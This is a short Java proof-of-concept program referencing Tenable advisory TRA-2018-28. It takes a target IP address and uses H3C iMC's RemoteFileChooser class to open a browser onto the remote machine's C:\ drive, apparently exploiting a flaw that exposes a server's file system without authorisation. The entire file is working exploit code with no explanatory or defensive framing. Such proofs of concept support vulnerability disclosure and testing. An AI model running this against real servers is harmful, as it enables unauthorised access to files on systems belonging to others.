import java.net.InetAddress;
import java.net.UnknownHostException;

import com.h3c.imc.deploy.dma.RemoteFileChooser;

// https://www.tenable.com/security/research/tra-2018-28

public class Runit {

	public static void main(String[] args) {
		if (args.length < 1) {
			System.err.println("Usage: java Runit <ip>");
			System.exit(1);
		}
		
		String ip = args[0];
		try {
			InetAddress.getByName(ip);
		} catch (UnknownHostException e) {
			System.err.println("Invalid IP Address.");
			System.exit(1);
		}
		
		RemoteFileChooser chooser = new RemoteFileChooser(null, ip);
		chooser.setPath("C:\\");
		chooser.openRemoteFileChooserDialog();
	}
}
